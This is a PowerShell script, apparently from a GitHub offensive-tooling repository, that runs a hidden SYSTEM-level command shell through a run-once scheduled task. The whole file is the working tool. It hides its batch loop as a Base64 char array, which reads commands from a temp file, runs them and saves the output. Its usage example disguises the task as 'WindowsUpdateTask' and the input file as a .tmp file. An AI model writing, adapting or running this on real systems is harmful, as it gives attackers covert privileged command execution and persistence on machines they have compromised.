
Function Invoke-BatchJob()
{
<#

.SYNOPSIS
    A Powershell script that launches a batch command shell as `SYSTEM` using a run once scheduled task.

.DESCRIPTION
    Shell commands are written to a stdin file at which point the cmd shell will sleep for a period, read the lines from the input file, execute them one at a time and redirect output to a stdout file where it can be retrieved.

.PARAMETER Path
    Path to write batch command shell out to.

.PARAMETER InFile
    Path of command input file to use.

.PARAMETER TaskName
    Name to use for the run-once scheduled task.

.EXAMPLE
    Invoke-BatchJob -Path "C:\Windows\Temp\cmd.bat" -InputFile "C:\Windows\Temp\TMP486.tmp" -TaskName "WindowsUpdateTask"

.LINK
    https://github.com/Spacecow99/Invoke-BatchJob

.NOTES
    Script must be run with Administrator privileges in order to create scheduled task as 'NT AUTHORITY\SYSTEM'.

#>
    Param(
        [Parameter(Mandatory=$True, Position=0)]
        [String] $Path,

        [Parameter(Mandatory=$True, Position=1)]
        [String] $InputFile,
        
        [Parameter(Mandatory=$True, Position=2)]
        [String] $TaskName
    )

    # Char array of Base64 encoded command shell script
    [Char[]] $EncodedPayload = @(
        'Q', 'G', 'V', 'j', 'a', 'G', '8', 'g', 'b', '2', 'Z', 'm', 'D', 'Q', 'p', 'T', 'R', 'V', 'Q', 'g', 'Y', '2', '1', 'k',
        'X', '3', 'B', 'h', 'd', 'G', 'g', '9', 'I', 'n', 's', 'w', 'f', 'S', 'I', 'N', 'C', 'm', 'N', 'v', 'c', 'H', 'k', 'g',
        'T', 'l', 'V', 'M', 'I', 'C', 'V', 'j', 'b', 'W', 'R', 'f', 'c', 'G', 'F', '0', 'a', 'C', 'U', 'N', 'C', 'j', 'p', 's',
        'b', '2', '9', 'w', 'D', 'Q', 'p', 'w', 'a', 'W', '5', 'n', 'I', 'C', '1', 'u', 'I', 'D', 'E', 'g', 'M', 'S', '4', 'x',
        'L', 'j', 'E', 'u', 'M', 'S', 'A', '+', 'I', 'G', '5', '1', 'b', 'A', '0', 'K', 'Z', 'm', '9', 'y', 'I', 'C', '9', 'm',
        'I', 'C', 'J', '0', 'b', '2', 't', 'l', 'b', 'n', 'M', '9', 'K', 'i', 'I', 'g', 'J', 'S', 'V', 'h', 'I', 'G', 'l', 'u',
        'I', 'C', 'g', 'l', 'Y', '2', '1', 'k', 'X', '3', 'B', 'h', 'd', 'G', 'g', 'l', 'K', 'S', 'B', 'k', 'b', 'y', 'A', 'o',
        'D', 'Q', 'o', 'g', 'I', 'C', 'A', 'g', 'a', 'W', 'Y', 'g', 'I', 'i', 'U', 'l', 'Y', 'S', 'I', 'g', 'Z', 'X', 'F', '1',
        'I', 'C', 'J', 'k', 'a', 'W', 'U', 'i', 'I', 'C', 'g', 'N', 'C', 'i', 'A', 'g', 'I', 'C', 'A', 'g', 'I', 'C', 'A', 'g',
        'c', 'm', 'V', 't', 'I', 'G', 'R', 'l', 'b', 'C', 'A', 'v', 'Y', 'S', 'A', 'l', 'Y', '2', '1', 'k', 'X', '3', 'B', 'h',
        'd', 'G', 'g', 'l', 'D', 'Q', 'o', 'g', 'I', 'C', 'A', 'g', 'I', 'C', 'A', 'g', 'I', 'H', 'J', 'l', 'b', 'S', 'B', 'k',
        'Z', 'W', 'w', 'g', 'L', '2', 'E', 'g', 'J', 'W', 'N', 't', 'Z', 'F', '9', 'w', 'Y', 'X', 'R', 'o', 'J', 'S', '5', 'y',
        'Z', 'X', 'Q', 'N', 'C', 'i', 'A', 'g', 'I', 'C', 'A', 'g', 'I', 'C', 'A', 'g', 'Z', 'W', 'N', 'o', 'b', 'y', 'B', 'k',
        'a', 'W', 'U', 'g', 'P', 'j', '4', 'g', 'J', 'W', 'N', 't', 'Z', 'F', '9', 'w', 'Y', 'X', 'R', 'o', 'J', 'S', '5', 'y',
        'Z', 'X', 'Q', 'N', 'C', 'i', 'A', 'g', 'I', 'C', 'A', 'g', 'I', 'C', 'A', 'g', 'Z', '2', '9', '0', 'b', 'y', 'B', 'l',
        'b', 'm', 'Q', 'N', 'C', 'i', 'A', 'g', 'I', 'C', 'A', 'p', 'I', 'G', 'V', 's', 'c', '2', 'U', 'g', 'K', 'A', '0', 'K',
        'I', 'C', 'A', 'g', 'I', 'C', 'A', 'g', 'I', 'C', 'B', 'l', 'Y', '2', 'h', 'v', 'I', 'C', 'U', 'l', 'Y', 'S', 'A', '+',
        'P', 'i', 'A', 'l', 'Y', '2', '1', 'k', 'X', '3', 'B', 'h', 'd', 'G', 'g', 'l', 'L', 'n', 'J', 'l', 'd', 'A', '0', 'K',
        'I', 'C', 'A', 'g', 'I', 'C', 'A', 'g', 'I', 'C', 'A', 'l', 'J', 'W', 'E', 'g', 'P', 'j', '4', 'g', 'J', 'W', 'N', 't',
        'Z', 'F', '9', 'w', 'Y', 'X', 'R', 'o', 'J', 'S', '5', 'y', 'Z', 'X', 'Q', 'g', 'M', 'j', '4', 'm', 'M', 'Q', '0', 'K',
        'I', 'C', 'A', 'g', 'I', 'C', 'A', 'g', 'I', 'C', 'B', 'l', 'Y', '2', 'h', 'v', 'I', 'C', '0', 't', 'L', 'S', '0', 't',
        'L', 'S', '0', 't', 'L', 'S', '0', 't', 'L', 'S', '0', 't', 'L', 'S', '0', 't', 'L', 'S', '0', 't', 'L', 'S', '0', 't',
        'L', 'S', '0', 't', 'L', 'S', '0', 't', 'L', 'S', '0', 't', 'L', 'S', '0', 't', 'L', 'S', '0', 't', 'L', 'S', '0', 't',
        'L', 'S', '0', 't', 'L', 'S', '0', 't', 'L', 'S', '0', 't', 'L', 'S', '0', 't', 'L', 'S', '0', 't', 'I', 'D', '4', '+',
        'I', 'C', 'V', 'j', 'b', 'W', 'R', 'f', 'c', 'G', 'F', '0', 'a', 'C', 'U', 'u', 'c', 'm', 'V', '0', 'D', 'Q', 'o', 'g',
        'I', 'C', 'A', 'g', 'K', 'Q', '0', 'K', 'K', 'Q', '0', 'K', 'Y', '2', '9', 'w', 'e', 'S', 'B', 'O', 'V', 'U', 'w', 'g',
        'J', 'W', 'N', 't', 'Z', 'F', '9', 'w', 'Y', 'X', 'R', 'o', 'J', 'Q', '0', 'K', 'Z', '2', '9', '0', 'b', 'y', 'B', 's',
        'b', '2', '9', 'w'
    )

    If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        [String] $Payload = ([System.Text.Encoding]::ASCII.GetString(([Convert]::FromBase64CharArray($EncodedPayload, 0, $EncodedPayload.Length))) -f $InputFile)
        If (Test-Path -Path $Path)
        {
            Remove-Item -Path $Path -Force
        }
        Add-Content -Path $Path -Value $Payload -Force
        # TODO Make this a COM object 
        Invoke-Expression -Command ("schtasks /CREATE /RU 'NT AUTHORITY\SYSTEM' /SC Once /TR '{0}' /TN '{1}' /F /Z" -f $Path, $TaskName) | Out-Null
        Invoke-Expression -Command ("schtasks /RUN /TN '{0}' /I" -f $TaskName) | Out-Null
        Get-Item -Path $InputFile
    }
    Else
    {
        Throw [UnauthorizedAccessException]::New('Operation requires administrative priviledges.')
    }
}
